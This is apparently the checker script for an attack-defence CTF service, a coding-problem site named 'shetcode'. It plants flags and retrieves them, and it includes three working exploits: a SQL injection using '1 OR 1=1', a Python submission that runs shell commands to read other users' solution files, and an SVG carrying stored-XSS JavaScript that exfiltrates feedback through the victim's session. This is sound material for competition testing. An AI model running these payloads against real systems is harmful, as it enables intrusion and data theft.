from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker
import json
import re
from httpx import AsyncClient
from title_generator import generate_title, generate_problem_from_scenario, generate_funny_username
from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 8055
checker = Enochecker("shetcode", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

class Connection:
    def __init__(self, logger: LoggerAdapter, client: AsyncClient):
        self.client = client
        self.logger = logger

    async def register_user(self, username: str, password: str):
        response = await self.client.post(
            "/register",
            data={"username": username, "password": password}
        )
        data = response.json()
        
        if data.get("success") == False or response.status_code not in [200, 201, 302]:
            raise MumbleException("Failed to register user")

    async def login_user(self, username: str, password: str):
        response = await self.client.post(
            "/login",
            data={"username": username, "password": password}
        )
        data = response.json()
        
        if data.get("success") == False or response.status_code not in [200, 201, 302]:
            raise MumbleException("Failed to log in!")


@checker.register_dependency
def _get_connection(client: AsyncClient, logger: LoggerAdapter) -> Connection:
    return Connection(logger, client)


"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_drafts(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    conn = Connection(logger, client)
    username: str = generate_funny_username()
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    await conn.register_user(username, password)

    await conn.login_user(username, password)

    problem_title = "problem_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    
    try: 
        headers = {"Accept": "application/json"}
        response = await conn.client.post(
            "/problems/create",
            headers=headers,
            data={
                "title": problem_title,
                "description": task.flag,
                "difficulty": random.choice(["Easy", "Medium", "Hard"]),
                "testCases": json.dumps(["sample input"]),
                "expectedOutputs": json.dumps(["sample output"]),
                "isPublished": "false",
                "isPrivate": "false",
                "maxRuntime": "1.0"
            }
        )
        
        data = response.json()
        
        problem_id = data.get("problem_id")
        
        await db.set("userdata", (username, password, problem_id))
        
    except Exception as ex:
        raise MumbleException(f"Error posting flag")
        
    return username

@checker.putflag(1)
async def putflag_solutions(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    conn = Connection(logger, client)
    username: str = generate_funny_username()
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    await conn.register_user(username, password)

    await conn.login_user(username, password)

    problem_title = generate_title()
    problem_description, test_cases_json, expected_outputs_json = generate_problem_from_scenario()

    headers = {"Accept": "application/json"}
    response = await conn.client.post(
            "/problems/create",
            headers=headers,
            data={
                "title": problem_title,
                "description": problem_description,
                "difficulty": random.choice(["Easy", "Medium", "Hard"]),
                "testCases": test_cases_json,
                "expectedOutputs": expected_outputs_json,
                "isPublished": "true",
                "isPrivate": "false",
                "maxRuntime": "1.0"
            }
        )

    data = response.json()
    problem_id = data.get("problem_id")
    
    response = await conn.client.post(
        f"/problems/details/{problem_id}/submit",
        data={"code": f"""print("{task.flag}")"""}
    )
    
    if response.status_code != 200:
        raise MumbleException(f"Error posting flag")
    
    await db.set("userdata", (username, password, problem_id))

@checker.putflag(2)
async def putflag_feedback(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    conn = Connection(logger, client)
    username: str = generate_funny_username()
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    await conn.register_user(username, password)
    await conn.login_user(username, password)

    response = await conn.client.post(
        "/feedback/submit",
        data={
            "description": task.flag,
            "image": None
        }
    )

    if response.status_code not in [200, 201, 302]:
        raise MumbleException(f"Failed posting flag")
    
    await db.set("userdata", (username, password))

@checker.getflag(0)
async def getflag_drafts(
    task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
) -> None:
    try:
        username, password, problem_id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    conn = Connection(logger, client)

    await conn.login_user(username, password)

    response = await conn.client.get(f"/problems/{problem_id}/edit")
    
    if response.status_code != 200:
        raise MumbleException(f"Failed to retrieve flag.")
    
    content = response.text
    
    escaped_flag = task.flag.replace('/', r'\/').replace('<', r'&lt;').replace('>', r'&gt;')
    if task.flag not in content and escaped_flag not in content:
        raise MumbleException("Flag was not found.")
    
@checker.getflag(1)
async def getflag_solutions(
    task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
) -> None:
    try:
        username, password, problem_id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    conn = Connection(logger, client)

    await conn.login_user(username, password)

    response = await conn.client.get(f"/problems/details/{problem_id}")

    if response.status_code != 200:
        raise MumbleException(f"Failed to retrieve flag.")
    
    content = response.text

    escaped_flag = task.flag.replace('/', r'\/').replace('<', r'&lt;').replace('>', r'&gt;')
    if task.flag not in content and escaped_flag not in content:
        raise MumbleException(f"Flag was not found.")
    
@checker.getflag(2)
async def getflag_feedback(
    task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
) -> None:
    try:
        username, password = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    conn = Connection(logger, client)

    await conn.login_user(username, password)

    response = await conn.client.get("/feedback")
    
    if response.status_code not in [200, 201, 302]:
        raise MumbleException(f"Failed to retrieve flag.")
    
    content = response.text


    escaped_flag = task.flag.replace('/', r'\/').replace('<', r'&lt;').replace('>', r'&gt;')
    if task.flag not in content and escaped_flag not in content:
        raise MumbleException("Flag was not found.")
    

@checker.exploit(0)
async def exploit_drafts(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    username: str = generate_funny_username()
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    conn = Connection(logger, client)
    await conn.register_user(username, password)
    await conn.login_user(username, password)

    response = await conn.client.post(
        "/api/problems",
        data={"author_id": "1 OR 1=1"}
    )
    
    if response.status_code not in [200, 201, 302]:
        logger.debug(f"Failed to exploit service: HTTP {response.status_code, response.text}")
        raise MumbleException(f"Failed to exploit service: HTTP {response.status_code}")
    
    logger.debug(f"Exploit response: {response.text}")
    data = response.json()
    logger.debug(f"Exploit response: {data}")
    
    for problem in data:
        if not problem.get("is_published", False):
            description = problem.get("description", "")
            if flag := searcher.search_flag(description):
                return flag
    
    raise MumbleException("No flag found in any problem description")

@checker.exploit(1)
async def exploit_solutions(task: ExploitCheckerTaskMessage, 
                   searcher: FlagSearcher, 
                   client: AsyncClient, 
                   logger: LoggerAdapter
) -> Optional[str]:
    username: str = generate_funny_username()
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    conn = Connection(logger, client)
    await conn.register_user(username, password)
    await conn.login_user(username, password)

    problems_response = await conn.client.post("/api/problems")
    
    if problems_response.status_code not in [200, 201, 302]:
        raise MumbleException(f"Failed to get problems: {problems_response.status_code}")
    
    problems = problems_response.json()
    
    if not problems or len(problems) == 0:
        raise MumbleException("No problems available for exploit")
    
    exploit_script = """import os
os.system('find submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
"""

    response = await conn.client.post(
        f"/problems/details/{problems[0]['id']}/submit",
        data={"code": exploit_script}
    )

    if response.status_code != 200:
        raise MumbleException(f"Failed to submit exploit: {response.status_code}")
    
    data = response.text.replace('\/', '/').replace('\\u003E', r'>').replace('\\u003C', r'<')

    if flag := searcher.search_flag(data):
        return flag
    
    raise MumbleException(f"No flag found.")

@checker.exploit(2)
async def exploit_feedback(task: ExploitCheckerTaskMessage, 
                   searcher: FlagSearcher, 
                   client: AsyncClient, 
                   logger: LoggerAdapter
) -> Optional[str]:
    username: str = generate_funny_username()
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    
    conn = Connection(logger, client)
    await conn.register_user(username, password)
    await conn.login_user(username, password)
    
    malicious_js = f"""
        (async () => {{
        try {{
            const rows = document.querySelectorAll('tbody tr');
            if (rows.length === 0) {{
            return;
            }}

            for (const row of rows) {{
            const cell = row.querySelector('td:nth-child(3)');
            const feedbackText = cell ? cell.textContent.trim() : '';
            
            if (!feedbackText || feedbackText === 'SCRIPTED_FLAG_CAPTURED') {{
                continue;
            }}
            
            const flag = feedbackText;

            const params = new URLSearchParams({{
                title:           flag,
                description:     `Captured feedback: ${{flag}}`,
                difficulty:      'Easy',
                testCases:       JSON.stringify(['dummy input']),
                expectedOutputs: JSON.stringify(['dummy output']),
                maxRuntime:      '1.0',
                isPublished:     'false',
                isPrivate:       'true',
                accessUsers:     '{username}'
            }});

            const res = await fetch('/problems/create', {{
                method:      'POST',
                credentials: 'include',
                headers:     {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                body:        params.toString()
            }});
            }}
        }} catch (e) {{
        }}
        }})();
    """
    
    svg_payload = f"""<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <script type="text/javascript">
        {malicious_js}
        </script>
        <rect width="100" height="100" fill="blue" />
    </svg>
    """
    
    import tempfile
    import os
    
    temp_dir = tempfile.mkdtemp()
    svg_path = os.path.join(temp_dir, "exploit.svg")
    
    with open(svg_path, "w") as f:
        f.write(svg_payload)
    
    with open(svg_path, 'rb') as svg_file:
        files = {'image': ('exploit.svg', svg_file, 'image/svg+xml')}
        data = {'description': 'SCRIPTED_FLAG_CAPTURED'}
        
        response = await conn.client.post(
            "/feedback/submit",
            data=data,
            files=files
        )
    
    os.unlink(svg_path)
    os.rmdir(temp_dir)
    
    if response.status_code not in [200, 201, 302]:
        raise MumbleException(f"Failed to submit feedback: {response.status_code}")
    
    await asyncio.sleep(85) 
    
    response = await conn.client.get('/private-problems')
    
    if response.status_code != 200:
        raise MumbleException(f"Failed to get private problems: {response.status_code}")
    
    data = response.text.replace('\/', '/').replace('&lt;', r'<').replace('&gt;', r'>')

    if flag := searcher.search_flag(data) or searcher.search_flag(response.text):
        return flag
            
    raise MumbleException("No flag found exploit(2).")

@checker.havoc(0)
async def havoc_feedback_image(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> None:
    conn = Connection(logger, client)
    username: str = generate_funny_username()
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    await conn.register_user(username, password)
    await conn.login_user(username, password)

    simple_svg = """<?xml version="1.0" encoding="UTF-8"?>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
    <text x="50" y="55" text-anchor="middle" fill="white" font-family="Arial" font-size="12">Test</text>
</svg>"""
    
    import tempfile
    import os
    
    temp_dir = tempfile.mkdtemp()
    svg_path = os.path.join(temp_dir, "simple_test.svg")
    
    with open(svg_path, "w") as f:
        f.write(simple_svg)
    
    with open(svg_path, 'rb') as svg_file:
        files = {'image': ('simple_test.svg', svg_file, 'image/svg+xml')}
        data = {'description': 'Test feedback with simple SVG image'}
        
        response = await conn.client.post(
            "/feedback/submit",
            data=data,
            files=files
        )
    
    os.unlink(svg_path)
    os.rmdir(temp_dir)

    if response.status_code not in [200, 201, 302]:
        raise MumbleException(f"Failed to submit feedback: {response.status_code}")
    
    await asyncio.sleep(2)
    
    response = await conn.client.get("/feedback")
    
    if response.status_code not in [200, 201, 302]:
        raise MumbleException(f"Failed to retrieve feedback page: {response.status_code}")
    
    content = response.text
    logger.debug(f"Feedback page content: {content}")
    
    if "Test feedback with simple SVG image" in content:
        logger.info("Simple SVG feedback successfully appears on feedback page")
    else:
        logger.warning("Simple SVG feedback does not appear on feedback page")
        raise MumbleException("Can't submit feedback with SVG image")

if __name__ == "__main__":
    checker.run()